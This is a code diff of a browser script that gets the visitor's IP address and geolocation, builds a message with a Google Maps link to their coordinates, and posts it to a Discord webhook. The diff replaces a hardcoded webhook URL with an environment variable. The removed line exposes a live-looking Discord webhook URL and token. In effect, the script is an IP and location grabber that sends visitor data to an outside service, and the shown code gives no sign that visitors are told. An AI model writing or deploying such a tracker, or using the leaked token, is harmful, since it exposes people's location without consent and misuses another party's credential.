@@ -1,4 +1,5 @@
 // Get the elements to display the information
+const URL = process.env.URL;
 const ipAddressElement = document.getElementById('ip-address');
 const locationElement = document.getElementById('location');
 const countryElement = document.getElementById('country');
@@ -34,7 +35,7 @@ fetch('https://api64.ipify.org?format=json')
                        `[Map](https://www.google.com/maps/search/?api=1&query=${ipData.latitude},${ipData.longitude})\n`;
 
         // Send to Discord Webhook
-        fetch('https://discord.com/api/webhooks/1332733975403171972/D7g66UzImBf2JjOEXLEKDHsHJJzsAzyvVC6pWXkrJAxVP5wIroj3gnBYFSbtTIqQXoE4', {
+        fetch(URL, {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
